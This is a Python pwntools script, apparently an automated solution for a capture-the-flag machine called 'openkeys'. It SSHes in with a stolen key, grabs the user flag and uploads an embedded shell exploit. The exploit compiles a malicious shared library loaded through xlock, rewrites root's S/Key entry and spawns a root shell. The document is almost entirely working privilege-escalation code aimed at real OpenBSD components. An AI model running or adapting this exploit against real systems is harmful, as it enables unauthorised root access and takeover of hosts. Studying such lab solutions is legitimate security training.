#!/bin/python3
# Author: 0xGeorge

import subprocess, threading, http.server, fcntl, socketserver
from pwn import *

PROMPT = 'openkeys$'
ROOT_PROMPT = 'openkeys#'
ROOT_CFILE = 'home/george/openkeys/swrast_dri.c'
PRIV_KEY = '/home/george/openkeys/ssh.priv.rsa' 
LOCAL_SCRIPT = '/dev/shm/root.sh'
REMOTE_SCRIPT = '/tmp/root.sh'
script = '''#!/bin/sh
if grep auth= /etc/login.conf | grep -q skey ; then
  target='skey'
else
  exit 1
fi 
cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
 
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
 
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF
gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
rm -fr swrast_dri.c
env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
group=$(echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66)
if [ "$group" = "auth" ]; then
  echo "[+] Success! we have auth group permissions"
else
  exit 1
fi
 
if [ "$target" = "skey" ]; then
  echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
  rm -rf swrast_dri.so
  env -i TERM=vt220 su -l -a skey
fi'''

def subprocess_cmd(command):
   shell = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
   shell_stdout = shell.communicate()[0].strip().decode()
   print(shell_stdout)

def local_script_write():
    log.progress(f"Temporarily creating root script in {LOCAL_SCRIPT}")
    with open(LOCAL_SCRIPT,"w") as i:
        i.write(script)
    log.success(f"Successfuly wrote to {LOCAL_SCRIPT}")
    
def sssh():
    s1 = ssh(host='10.10.10.199',user='jennifer',keyfile=f'{PRIV_KEY}',level='error')
    log.success("Connected via SSH")
    s2 = s1.run('sh')
    s2.recvuntil(PROMPT)
    
# Grabs the user flag and prints it to the screen
    log.progress("Fetching user flag")
    s2.sendline('cat user.txt')
    userflag = s2.recvuntil(PROMPT).decode().replace(PROMPT,'')
    userflag = userflag.replace("cat user.txt", '').strip()
    log.success("User flag is: " + str(userflag))

# Uploads and cleans up local root exploit script
    log.progress(f"Uploading root script to {REMOTE_SCRIPT}")
    s1.put(LOCAL_SCRIPT,REMOTE_SCRIPT)    
    log.success(f"Successfully uploaded root script to {REMOTE_SCRIPT}")
    log.progress(f"Removing local script from {LOCAL_SCRIPT}")
    subprocess_cmd(f'rm -fr {LOCAL_SCRIPT}')
    log.success(f"Successfully removed local script from {LOCAL_SCRIPT}")

# Makes remote script executeable and runs
    log.progress("Making script executeable")
    s2.sendline(f'chmod +x {REMOTE_SCRIPT}')
    s2.recvuntil(PROMPT)
    log.success("Script permissions successfully changed")
    log.progress("Running privilege escalation script")
    s2.sendline(f'{REMOTE_SCRIPT}')
    s2.recvuntil("S/Key Password:")
    s2.sendline('EGG LARD GROW HOG DRAG LAIN')
    s2.recvuntil(ROOT_PROMPT)

# Grab root flag and spawn interactive shell
    log.progress("Fetching root flag")
    s2.sendline('cat /root/root.txt')
    rootflag = s2.recvuntil(ROOT_PROMPT).decode().replace(ROOT_PROMPT,'')
    rootflag = rootflag.replace("cat /root/root.txt", '').strip()
    log.success("Root flag is: " + str(rootflag))
    log.progress("Spawning root shell")
    s2.interactive()

    s2.close()
    s1.close()

t1 = threading.Thread(target=local_script_write())
t1.start()
sleep(1)

t2 = threading.Thread(target=subprocess_cmd('chmod 600 {}'.format(PRIV_KEY)))
t2.start()
sssh()
sleep(1)
